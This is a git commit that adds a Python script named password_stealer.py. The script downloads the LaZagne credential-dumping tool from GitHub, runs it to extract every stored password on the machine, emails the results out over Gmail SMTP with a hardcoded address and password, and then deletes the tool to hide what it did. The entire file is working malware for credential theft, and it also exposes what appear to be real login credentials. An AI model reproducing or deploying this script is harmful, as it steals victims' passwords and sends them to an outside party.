e887228cab8a90e8c6b0420cc726eef9f2adca33
UVvirus <39599249+UVvirus@users.noreply.github.com>
2020-07-14 17:54:50 +0530

    Add files via upload

---
+++ password_stealer.py
@@ -0,0 +1,26 @@
+import requests
+import smtplib
+import subprocess
+import os
+import tempfile
+def download(url):
+    get_response=requests.get(url)
+    file_name=url.split("/")[-1]
+    with open(file_name,"wb")as file:
+        file.write(get_response.content)
+
+def send_mail(email,password,message):
+    server=smtplib.SMTP("smtp.gmail.com",587)
+    server.starttls()
+    server.login(email,password)
+    server.sendmail(email,email,message)
+    server.quit()
+#finding temporary directory
+temp_dir=tempfile.gettempdir()
+#changing from default location to tmp directorys
+os.chdir(temp_dir)
+download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
+result=subprocess.check_output("laZagne.exe all",shell=True)
+send_mail("yuvasyuvarajan@gmail.com","yr84963051999",result)
+#removes the virus after the work done
+os.remove("laZagne.exe")
